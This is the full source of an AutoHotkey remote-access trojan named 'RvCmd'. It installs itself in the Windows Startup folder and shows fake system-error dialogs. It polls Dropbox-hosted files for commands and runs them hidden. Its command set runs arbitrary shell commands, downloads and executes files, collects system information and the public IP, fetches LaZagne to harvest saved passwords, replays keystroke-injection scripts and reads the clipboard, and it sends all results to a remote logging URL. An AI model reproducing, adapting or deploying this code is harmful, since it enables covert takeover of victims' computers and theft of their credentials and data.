#SingleInstance force
#NoTrayIcon
RvCmdVersion := "1.1"
if A_WorkingDir != C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
	annoy(5)
binurl := "no"
	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
	whr.Open("GET", "https://www.dropbox.com/s/aitm2yv03u64zit/bin-url.txt?raw=1", true)
	whr.Send()
	whr.WaitForResponse()
	binraw := whr.ResponseText
	StringSplit, binArr,binraw,;
	binurl := binArr1
if 1 = update 
{
	temp:=  binurl "log=" A_ComputerName "--" A_UserName ":-_updated!"
	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
	whr.Open("GET", temp , true)
	whr.Send()
	whr.WaitForResponse()
	temp := whr.ResponseText
	filnam := StrReplace(A_ScriptName, " .exe" , ".exe")
	filedelete, %filnam%
}

if	binArr2 = 1
{
	IfNotExist, C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%A_ScriptName%
	{
		FileCopy, %A_ScriptName%, C:\Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
	}
}

	temp:=  binurl "log=" A_ComputerName "--" A_UserName ":-_linked_in!_RvCmd version:-" RvCmdVersion
	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
	whr.Open("GET", temp , true)
	whr.Send()
	whr.WaitForResponse()
	temp := whr.ResponseText
;OnExit("ExitFunc")
idlestate := 0
idletime := 300000
sleept := 10000
repcycl := 60
counter := 0
last_com_id := 0
mousean := 0
sendMode input
loop
{
	sleep %sleept%
	if (idlestate = 0) and (A_TimeIdlePhysical > idletime)
	{
		idlestate = 1
		temp2 := Round(A_TimeIdlePhysical/1000)
		temp :=  binurl "AFK=" A_ComputerName "--" A_UserName ":-User_afk_for:-" temp2 "s"
		whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
		whr.Open("GET",temp, true)
		whr.Send()
		whr.WaitForResponse()
		temp := whr.ResponseText
	}
	if (idlestate = 1) and (A_TimeIdlePhysical < idletime)
	{
		temp :=  binurl "AFK=" A_ComputerName "--" A_UserName ":-User_not_afk_anymore!"
		whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
		whr.Open("GET",temp, true)
		whr.Send()
		whr.WaitForResponse()
		temp := whr.ResponseText
		idlestate = 0
	}
	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
	whr.Open("GET", "https://www.dropbox.com/s/uj1id6b56tg7ex9/Reverse-cmd-command.txt?raw=1", true)
	whr.Send()
	whr.WaitForResponse()
	raw1 := whr.ResponseText
	StringSplit,BaseArray,raw1,;
	raw := BaseArray1
	;MsgBox % raw
	StringSplit, array, raw,°
	com_id := array1
	commandtemp := array2
	;soundBeep
	temp := -1
	;msgBox %com_id%-%last_com_id%
	if counter = 0
	{
		if BaseArray2 !=
		{
			Loop, parse, BaseArray2,^
			{
				outar := Interpret(A_LoopField,binurl,mousean,sleept,RvCmdVersion)
				mousean := outar[1]
				sleept := outar[2]
			}
		}
	}
	if counter = 60
	{
		counter := 1
		temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_still_online!_Afk_time:-" Round(A_TimeIdlePhysical/1000) "s"
		whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
		whr.Open("GET",temp, true)
		whr.Send()
		whr.WaitForResponse()
		temp := whr.ResponseText	
	}
	if (not com_id = last_com_id) or (com_id = 666)
	{
	Loop, parse, commandtemp,^
	{
		outar := Interpret(A_LoopField,binurl,mousean,sleept,RvCmdVersion)
		mousean := outar[1]
		sleept := outar[2]
	}
	}
	last_com_id := com_id
	counter := counter + 1
}

~LButton::
	if mousean = 1
	{
		MouseGetPos,X,Y
		X := X-70
		Y := Y-80
		Gui, Show, X%X% Y%Y%
		MouseMove, X, Y , 20
		
	}
return

annoy(val)
{
loop{
	runwait cmd /c ipconfig && cd %A_WinDir%\system32 && dir 
	if A_Index > 1
		MsgBox, 4405,Kernel Corrupt!,It seems like your windows kernel is corrupt! `nPlease reinstall Windows or contact your local repair shop!
	else
		MsgBox, 4373,Fatal error while installing!,There was a fatal error while installing! Please try again or contact the software distributor!
	
	IfMsgBox Cancel
		break
}
}

ExitFunc(ExitReason, ExitCode)
{
	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
	whr.Open("GET", "https://www.dropbox.com/s/aitm2yv03u64zit/bin-url.txt?raw=1", true)
	whr.Send()
	whr.WaitForResponse()
	binraw2 := whr.ResponseText
	StringSplit, bin2Arr,binraw2, ;
	binurl := bin2Arr1
	
	temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_closing_with_reason:-" ExitReason "_" ExitCode
	whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
	whr.Open("GET",temp, true)
	whr.Send()
	whr.WaitForResponse()
	temp := whr.ResponseText
	
}
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

Interpret(command,binurl,mousean,sleept,RvCmdVersion)
{
		StringSplit, SubArray, command, %A_Space%

		
		if SubArray1 = rvcmd
		{
		
			if SubArray2 = mouse
			{
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-mouse_annoy_mode_now:-" SubArray3
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				UrlDownloadToFile,https://www.dropbox.com/s/m5wd1zem790jdyd/pedo.png?dl=1,pedo.png
				sleep 5000
				Gui, Add, Pic, w100 h100, pedo.png
				mousean := SubArray3
			}
			else if SubArray2 = interpret
			{	
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-interpretting_contents_of:-" SubArray3
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",SubArray3, true)
				whr.Send()
				whr.WaitForResponse()
				Coms := whr.ResponseText
				
				if Coms !=
				{
					Loop, parse, Coms,^
					{
						outar := Interpret(A_LoopField,binurl,mousean,sleept,RvCmdVersion)
						mousean := outar[1]
						sleept := outar[2]
					}
				}
			}
			else if SubArray2 = printfile
			{
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-now_dowloading_and_printing:-" SubArray3
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				
				filedelete, %A_Temp%\noice.txt
				UrlDownloadToFile, %SubArray3%, %A_Temp%\noice.txt
				runwait, notepad /P %A_Temp%\noice.txt,,Hide
				filedelete, %A_Temp%\noice.txt
			}
			else if SubArray2 =	printtext
			{
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-now_printing_:-" SubArray3
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				
				Value := SubStr(command,17)
				;StringReplace, Value, Value,~,`n, All
				filedelete, %A_Temp%\noice.txt
				fileappend, %Value%, %A_Temp%\noice.txt
				runwait, notepad /P %A_Temp%\noice.txt,,Hide
				filedelete, %A_Temp%\noice.txt
			}
			else if SubArray2 = reportcycles
			{
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-report_cycles_now:-" SubArray3
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				repcycl := SubArray3
			}
			else if SubArray2 = speak
			{
				tempcom := SubStr(command,13)
				
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-now_speaking:-" tempcom
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				
				ComObjCreate("SAPI.SpVoice").Speak(tempcom)
			}
			else if SubArray2 = idletime
			{
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-idletime_now:-" SubArray3
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				idletime := Subarray3*1000
			}
			else if SubArray2 = metasploit
			{
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET","https://www.dropbox.com/s/92u21ghy5t5v56c/Metasploit.txt?raw=1", true)
				whr.Send()
				whr.WaitForResponse()
				metasploit := whr.ResponseText
				
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-running_metasploit_command:-" metasploit
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				
				run, cmd /c %metasploit%,,Hide
			
			
			}
			else if SubArray2 = info
			{
				DetectHiddenWindows On
				Run %ComSpec%,, Hide, pid
				WinWait ahk_pid %pid%
				DllCall("AttachConsole", "UInt", pid)
				WshShell := ComObjCreate("Wscript.Shell")
				exec := WshShell.Exec("systeminfo")
				Value := exec.StdOut.ReadAll()
				DllCall("FreeConsole")
				Process Close, %pid%
				
				;MsgBox % StrLen(Value)
				StringReplace, Value, Value, `r`n, ~, All
				
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET","https://api.ipify.org", true)
				whr.Send()
				whr.WaitForResponse()
				pubIp := whr.ResponseText
				
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-SYSTEM_INFO:-~UserName:-" A_UserName "~IsAdmin:-" A_IsAdmin "~Is64bit:-" A_Is64bitOS "~PublicIP:-" pubIp "~Res:-" A_ScreenWidth "x" A_ScreenHeight "~WorkingDir:-" A_WorkingDir "~~" SubStr(Value,1,3000)
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-SYSTEM_INFO2:-" SubStr(Value,3001)
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				
			}
			else if SubArray2 = urlrun
			{
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-downloading_file_from:-" SubArray3 "-:to:-" SubArray4 "-:and_running_it!"
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				UrlDownloadToFile,%SubArray3%,%SubArray4%
				run %SubArray4%,,%SubArray5%
			}
			else if SubArray2 = update
			{
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-dowloading_update_exe_from:-" SubArray3
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				filnam := StrReplace(A_ScriptName, ".exe" , " .exe")
				UrlDownloadToFile,%SubArray3%,filnam
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-rehooking!"
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
				run, cmd /c %A_WorkingDir%\filnam update
				exitapp
			}
			else if SubArray2 = report
			{
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_still_online!_Afk_time:-" Round(A_TimeIdlePhysical/1000) "s"
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
			}
			else if Subarray2 = sendcon
			{
			tempcom := SubStr(command,15)
			;run, cmd.exe /k echo off & cls & %tempcom% & title OKE
			;winwait, OKE
			;Value := ComObjCreate("WScript.Shell").Exec("cmd.exe /q /c " tempcom).StdOut.ReadAll()
			
			DetectHiddenWindows On
			Run %ComSpec%,, Hide, pid
			WinWait ahk_pid %pid%
			DllCall("AttachConsole", "UInt", pid)
			WshShell := ComObjCreate("Wscript.Shell")
			exec := WshShell.Exec("cmd /c " tempcom)
			Value := exec.StdOut.ReadAll()
			DllCall("FreeConsole")
			Process Close, %pid%
			
			StringReplace, Value, Value, `r`n, ~, All
			Vallen := Strlen(Value) + 50
			;msgBox, %Vallen%
			loopcount1 := Vallen/3000
			loopcount2 := ceil(loopcount1)
			if loopcount2 > 1
			{
			temp :=  binurl "sendc=" A_ComputerName "--" A_UserName ":-beginning_output_stream_of_:-" tempcom
			whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
			whr.Open("GET",temp, true)
			whr.Send()
			whr.WaitForResponse()
			temp := whr.ResponseText
			loop %loopcount2% {
				index := A_Index -1
				num := index * 3000
				tempStr := SubStr(Value,num,2999)
				temp :=  binurl "data=" A_ComputerName "--" A_UserName ":-sendc:-" tempStr
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
			}
			temp :=  binurl "sendc=" A_ComputerName "--" A_UserName ":-_output_stream_ended!"
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
			}
			else
			{
			
				temp :=  binurl "sendc=" A_ComputerName "--" A_UserName ":-output_of_:-" tempcom "-:-" Value
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
			
			
			
			}
			}
			else if SubArray2 = lazagne
			{
				;UrlDownloadToFile,https://www.dropbox.com/s/b14t88dzhenwfcw/lazag.exe?dl=1,lazag.exe
				;runWait, cmd /c %A_WorkingDir%\lazag.exe
				;filedelete, lazag.exe
				UrlDownloadToFile,*0 https://www.dropbox.com/s/y5akkq7sddz04nd/laZagne.exe?dl=1, %A_Temp%\laz.exe

				DetectHiddenWindows On
				Run %ComSpec%,, Hide, pid
				WinWait ahk_pid %pid%
				DllCall("AttachConsole", "UInt", pid)
				WshShell := ComObjCreate("Wscript.Shell")
				exec := WshShell.Exec(A_Temp "\laz.exe all")
				data := exec.StdOut.ReadAll()
				MsgBox %output%
				DllCall("FreeConsole")
				Process Close, %pid%
				
				
				data2 := SubStr(data,510)
				StringReplace, data3, data2,Password found !!!, ``, All  ; Replace each <br> with an accent.
				StringSplit, dataray, data3, ``  ; Split the string based on the accent character.
					temp :=  binurl "laz=" A_ComputerName "--" A_UserName ":-_beginning_lazagne_stream!"
					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
					whr.Open("GET",temp, true)
					whr.Send()
					whr.WaitForResponse()
					temp := whr.ResponseText
					
				loop %dataray0%
				{
					temp := binurl "data=" dataray%A_Index%
					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
					whr.Open("GET", temp, true)
					whr.Send()
					whr.WaitForResponse()
					raw1 := whr.ResponseText
				}
					temp :=  binurl "laz=" A_ComputerName "--" A_UserName ":-_lazagne_stream_ended!"
					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
					whr.Open("GET",temp, true)
					whr.Send()
					whr.WaitForResponse()
					temp := whr.ResponseText
			}
			else if SubArray2 = unhook
			{
					temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_unhooking_machine,c_u_next_startup!"
					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
					whr.Open("GET",temp, true)
					whr.Send()
					whr.WaitForResponse()
					temp := whr.ResponseText
				ExitApp
			}
			else if SubArray2 = cure
			{
					temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-_curing_machine,Good_bye!"
					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
					whr.Open("GET",temp, true)
					whr.Send()
					whr.WaitForResponse()
					temp := whr.ResponseText
				filedelete,%A_WinDir%Users\%A_UserName%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\%A_ScriptName%
				ExitApp
			}
			else if SubArray2 = sleeptime
			{
					temp :=  binurl "laz=" A_ComputerName "--" A_UserName ":-_update_interval_now:-" SubArray3
					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
					whr.Open("GET",temp, true)
					whr.Send()
					whr.WaitForResponse()
					temp := whr.ResponseText
				sleept := SubArray3
			}
			else if SubArray2 = ducky
			{
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET", SubArray3 , true)
				whr.Send()
				whr.WaitForResponse()
				duckyscript := whr.ResponseText
				
					temp :=  binurl "laz=" A_ComputerName "--" A_UserName ":-_duckyng_contents_of:-" SubArray3
					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
					whr.Open("GET",temp, true)
					whr.Send()
					whr.WaitForResponse()
					temp := whr.ResponseText
					
				defdel := 0
				debug := 0
				Loop, parse, duckyscript, `n, `r
				{
				TestString := A_LoopField
				StringSplit, word_array, TestString, %A_Space%, .  ; Omits periods.
				command := word_array1
				;MsgBox, The Command is %command%.
				StringLen, len, word_array1
				len := len+2
				StringMid, params,TestString,len
				;MsgBox,  "%command%":"%params%"
				if debug = 1
					SoundBeep
					
					
				if command = DEBUG
						debug := 1
				else if command = DEFAULT_DELAY
						defdel := params
					
				else if command = DEFAULTDELAY
						defdel := params
					
				else if command = DELAY
						sleep, params
					
				else if command = STRING
						send,{raw} %params%
					
				else if command = GUI
						send, #%params%
						
				else if command = WINDOWS
						send, #%params%
						
				else if command = APP
						send, +{F10}
						
				else if command = MENU
						send, +{F10}
						
				else if command = SHIFT
						send, +{%params%}

				else if command = ALT
						send, !{%params%}

				else if command = CONTROL
						send, ^{%params%}
						
				else if command = CTRL
						send, ^{%params%}
						
				else if command = DOWN
						send, {DOWN}
						
				else if command = DOWNARROW
						send, {DOWN}
						
				else if command = UP
						send, {UP}
						
				else if command = UPARROW
						send, {UP}
						
				else if command = LEFT
						send, {LEFT}
						
				else if command = LEFTARROW
						send, {LEFT}
						
				else if command = RIGHT
						send, {RIGHT}
						
				else if command = RIGHTARROW
						send, {RIGHT}
						
				else if command = ENTER
						send, {enter}
						
				else if command = AHK
						send, %params%
				
				else if command = CLIP
				{
					temp :=  binurl "laz=" A_ComputerName "--" A_UserName ":-_contents_of_Clipboard:-" ClipBoard
					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
					whr.Open("GET",temp, true)
					whr.Send()
					whr.WaitForResponse()
					temp := whr.ResponseText
				}
				sleep, defdel
				}
			}
			else
			{
				temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-command:-" SubArray2 "-:wasn´t recognized!_RvCmd version:-" RvCmdVersion
				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
				whr.Open("GET",temp, true)
				whr.Send()
				whr.WaitForResponse()
				temp := whr.ResponseText
			}
		}
		else if command !=
		{
			run cmd /c %command% ,,Hide
			temp :=  binurl "log=" A_ComputerName "--" A_UserName ":-ran:-" command
			whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
			whr.Open("GET",temp, true)
			whr.Send()
			whr.WaitForResponse()
			temp := whr.ResponseText
		}
		return [mousean,sleept]
	}
